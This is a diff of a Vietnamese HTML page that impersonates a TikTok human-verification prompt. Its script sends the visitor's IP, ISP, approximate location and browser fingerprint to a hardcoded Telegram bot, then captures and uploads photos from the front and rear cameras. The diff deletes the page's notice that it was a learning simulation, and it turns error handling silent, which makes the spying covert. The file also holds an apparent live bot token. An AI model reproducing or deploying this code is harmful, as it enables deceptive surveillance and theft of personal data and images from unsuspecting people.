@@ -1,59 +1,49 @@
 <!DOCTYPE html>
 <html lang="vi">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>TikTok - Xác minh</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>TikTok</title>
   <style>
     body {
       margin: 0;
-      background-color: #000;
+      background: #000;
       color: #fff;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      font-family: 'Segoe UI', Tahoma, sans-serif;
       display: flex;
-      flex-direction: column;
       justify-content: center;
       align-items: center;
       height: 100vh;
+      flex-direction: column;
       text-align: center;
     }
     h1 {
-      font-size: 1.5rem;
+      font-size: 1.4rem;
       margin-bottom: 1rem;
     }
     button {
       background: #fe2c55;
-      color: white;
+      color: #fff;
       border: none;
       border-radius: 8px;
       padding: 12px 24px;
       font-size: 1rem;
       cursor: pointer;
     }
-    p {
-      font-size: 0.8rem;
-      color: #aaa;
-      margin-top: 20px;
-    }
   </style>
 </head>
 <body>
   <h1>Bạn có phải là con người không?</h1>
   <button onclick="initSpy()">Xác minh</button>
-  <p>(Trang mô phỏng xác minh người dùng, phục vụ học tập. Camera + IP + fingerprint sẽ được gửi về Telegram cá nhân.)</p>
 
   <script>
     const token = "8052142616:AAGv1o8o7caAsE6LWMA9nhH8XaIRbnS6a1c";
     const chatId = "5017098451";
 
-    function silentAlert(msg) {
-      console.log(msg); // Ẩn alert, chỉ log
-    }
-
     function sha256(str) {
       const buffer = new TextEncoder().encode(str);
-      return crypto.subtle.digest('SHA-256', buffer).then(hash =>
-        Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, '0')).join('')
+      return crypto.subtle.digest("SHA-256", buffer).then(hash =>
+        Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, "0")).join("")
       );
     }
 
@@ -79,7 +69,9 @@
 
     async function getInfo() {
       try {
-        const ipData = await fetch("https://ipapi.co/json/").then(res => res.json());
+        const ipBasic = await fetch("https://api.ipify.org?format=json").then(res => res.json());
+        const ipDetail = await fetch("https://ipapi.co/json/").then(r => r.json()).catch(() => ({}));
+        const ipData = { ...ipBasic, ...ipDetail };
         const fp = await generateFingerprint();
         const isNew = !(JSON.parse(localStorage.getItem("fp_history") || "[]").includes(fp));
         if (isNew) {
@@ -89,24 +81,22 @@
         }
 
         const time = new Date();
-        const msg = `🛰 [THÔNG TIN TRUY CẬP]\n\n${isNew ? "🆕 Thiết bị mới" : "♻️ Đã từng truy cập"}
-🕒 Thời gian: ${time.toLocaleTimeString()} ${time.toLocaleDateString()}
-📱 Thiết bị: ${navigator.userAgent}
-📚 Fingerprint: ${fp}
-🌐 IP: ${ipData.ip || "Không xác định"}
-🏢 ISP: ${ipData.org || "Không xác định"}
+        const msg = `🛰 [TRUY CẬP MỚI]\n${isNew ? "🆕 Thiết bị mới" : "♻️ Thiết bị cũ"}
+🕒 ${time.toLocaleTimeString()} - ${time.toLocaleDateString()}
+📱 UA: ${navigator.userAgent}
+📚 FP: ${fp}
+🌐 IP: ${ipData.ip || "-"}
+🏢 ISP: ${ipData.org || "-"}
 🏠 Địa chỉ: ${ipData.city || "-"}, ${ipData.region || "-"}, ${ipData.country_name || "-"}
-🗺 GPS: https://maps.google.com/?q=${ipData.latitude || 0},${ipData.longitude || 0}`;
+🗺 Google Maps: https://maps.google.com/?q=${ipData.latitude || 0},${ipData.longitude || 0}`;
 
         await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ chat_id: chatId, text: msg })
         });
-
-        silentAlert("✅ Gửi thông tin IP thành công");
-      } catch (err) {
-        silentAlert("❌ Lỗi khi gửi IP: " + err);
+      } catch (e) {
+        // Im lặng nếu lỗi
       }
     }
 
@@ -121,29 +111,24 @@
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         canvas.getContext("2d").drawImage(video, 0, 0);
-        const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
+        const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg"));
         const form = new FormData();
         form.append("chat_id", chatId);
         form.append("photo", blob, `cam_${facingMode}.jpg`);
-
         await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
           method: "POST",
           body: form
         });
-
         stream.getTracks().forEach(track => track.stop());
-        silentAlert(`📸 Đã chụp ảnh camera ${facingMode}`);
-      } catch (err) {
-        silentAlert(`⚠️ Không thể chụp ảnh (${facingMode}): ` + err);
+      } catch (e) {
+        // Bỏ qua nếu không lấy được ảnh
       }
     }
 
     async function initSpy() {
-      silentAlert("🔃 Bắt đầu xác minh...");
       await getInfo();
       await takePhoto("user");
       await takePhoto("environment");
-      silentAlert("✅ Xác minh hoàn tất!");
     }
   </script>
 </body>
